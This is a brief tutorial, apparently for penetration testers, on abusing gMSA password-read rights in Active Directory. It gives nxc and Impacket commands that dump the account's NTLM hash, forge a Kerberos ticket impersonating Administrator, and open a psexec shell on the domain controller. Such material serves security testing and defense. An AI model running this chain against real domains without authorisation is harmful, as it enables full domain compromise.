**Group Managed Service Accounts (gMSA)** are special Active Directory accounts designed to run services securely with automatically managed passwords. Certain principals (users or computers) are allowed to **read the gMSA password** from Active Directory.

If an attacker compromises one of these principals, they can retrieve the gMSA password, obtain its NTLM hash, and leverage it for **privilege escalation** or **lateral movement**.



---

## Attack Process

### 1. Enumerate gMSA Accounts

Use LDAP queries to identify gMSA accounts and which principals can read their passwords.

```bash
nxc ldap <dc-ip> -u <user> -p '<password>' --gmsa
```

Output shows:

- gMSA account name (e.g., `GMSA_SVC$`)
- NTLM hash of the gMSA password
- Principals allowed to read the password


### 2. Authenticate with gMSA Hash

Once the NTLM hash is obtained, it can be used to authenticate as the gMSA account.

```bash
nxc ldap <dc-ip> -u GMSA_SVC$ -H '<NTLM_HASH>'
```

This confirms valid authentication with the gMSA account.


### 3. Request Kerberos Ticket with Impacket

Use the gMSA hash to request a Kerberos service ticket (TGS) and impersonate a privileged user such as `Administrator`.

```bash
impacket-getST '<domain>/<gmsa_account>' -hashes :<NTLM_HASH> \
  -spn 'cifs/<dc-hostname>' -impersonate 'Administrator' -dc-ip <dc-ip>
```

This generates a Kerberos ticket (`.ccache` file) for the impersonated account.



### 4. Use the Ticket for Remote Code Execution

With the Kerberos ticket, execute commands remotely using Impacket tools such as `psexec`.

```bash
export KRB5CCNAME=<ccache_file_generated> 
impacket-psexec Administrator@<dc-hostname> -k -no-pass
```

This opens a remote shell as the impersonated Administrator.
